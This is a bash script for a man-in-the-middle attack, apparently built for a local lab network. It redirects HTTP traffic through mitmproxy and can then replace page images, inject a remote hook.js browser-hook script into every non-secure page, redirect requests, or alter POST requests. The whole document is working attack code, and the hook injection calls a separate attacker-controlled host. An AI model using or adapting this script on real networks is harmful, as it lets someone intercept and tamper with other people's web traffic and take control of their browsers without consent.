#!/bin/bash
# NOT FOR MUSTARD
#check for root/sudo
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

#Redirect all traffic on port 80 to 8080 to be intercepted by MITMProxy
iptables -t nat -A PREROUTING --protocol tcp --dport 80 -j REDIRECT --to-ports 8080

#replace all images with an image passed in as an argument (stored locally and hosted by the SimpleHTTPServer)
if [ "$1" = "image" ]; then
	if [ $# -ne 2 ]; then #check that two arguments have been passed - the second is the image to display
    		echo "You need to pass an image file name in"
    		exit 1
	fi
	echo replacing images
	mitmproxy -T --host --replace :~hq~s:"<img\s[^>]*?src\s*=\s*['\"]([^'\"]*?)['\"][^>]*?>":"<img src=\"http://192.168.99.1:8000/$2\">"

#inject hook into all non secure pages
elif [ "$1" = "hook" ]; then
	echo injecting hooks
	mitmproxy -T --host --replace :~hq~s:"<head>":"<head><script src=\"http://192.168.99.1:3000/hook.js\" type=\"text/javascript\"></script>"
#run custom redirection script
elif [ "$1" = "redirect" ]; then
	echo redirecting pages
	mitmproxy -T --host -s ../scripts-mitm/redirect_requests.py
elif [ "$1" = "posting" ]; then
	mitmproxy -T --host -e -s ../scripts-mitm/post_request.py
fi	

#run the simpleHTTPServer in the correct directory
#(cd files && python -m SimpleHTTPServer & )
